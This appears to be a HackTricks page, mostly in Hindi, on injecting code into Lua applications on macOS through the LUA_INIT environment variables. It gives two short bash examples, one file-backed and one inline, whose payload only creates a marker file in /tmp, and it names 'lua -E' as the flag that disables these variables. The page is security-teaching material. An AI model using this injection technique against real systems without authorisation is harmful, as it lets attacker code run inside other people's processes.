# macOS Lua Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `LUA_INIT`

कमांड-line options या target script को process करने से पहले, standalone Lua interpreter `LUA_INIT_<major>_<minor>` को execute करता है या, यदि versioned variable मौजूद नहीं है, तो `LUA_INIT` को execute करता है। `@` से शुरू होने वाली value किसी file का नाम बताती है; अन्य कोई भी value सीधे Lua code के रूप में evaluate की जाती है। इससे file-backed और fileless दोनों प्रकार का startup execution संभव होता है।<sup>[[1]](#references)</sup>
```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```
इंटरप्रेटर के अनुसार exact versioned name बदलता है, उदाहरण के लिए `LUA_INIT_5_4`। `lua -E` सभी environment variables को अनदेखा करता है, जिसमें startup code और Lua module paths भी शामिल हैं।

## References

- [1] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
{{#include ../../../banners/hacktricks-training.md}}
